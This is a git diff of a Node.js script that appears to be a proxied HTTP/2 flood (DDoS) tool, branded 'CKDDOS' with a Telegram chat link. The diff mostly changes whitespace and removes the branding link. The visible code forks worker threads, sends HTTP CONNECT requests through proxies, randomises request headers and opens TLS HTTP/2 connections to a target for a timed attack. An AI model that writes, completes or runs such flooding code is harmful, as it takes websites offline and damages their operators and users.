@@ -83,8 +83,8 @@ function proxyr() {
 
 if(cluster.isMaster) {
 const dateObj = new Date();
-
-    console.log(`Thanks For Using My Script<3-CKDDOS https://t.me/CKDDOSCHAT`);
+  
+    console.log(`Thanks For Using My Script<3`);
 
     for(var bb=0;bb<thread;bb++) {
 
@@ -95,7 +95,7 @@ const dateObj = new Date();
     setTimeout(() => {
 
         process.exit(-1)
-
+    
     }, time * 1000)
 
 }else {
@@ -123,13 +123,13 @@ const dateObj = new Date();
             "Accept-Language": lang(),
             "Cache-Control": controling(),
         }
-
+        
         const agent = new http.Agent({
             keepAlive: true,
             keepAliveMsecs: 20000,
             maxSockets: 0,
         });
-
+                
         var req = http.request({
             host: proxy[0],
             agent: agent,
@@ -145,9 +145,9 @@ const dateObj = new Date();
         }, function(){ 
             req.setSocketKeepAlive(true);
         });
-
+    
         req.on('connect', function (res, socket, head) { 
-
+        
             const client = http2.connect(parsed.href, {
                 createConnection: () => tls.connect({
                     host: parsed.host,
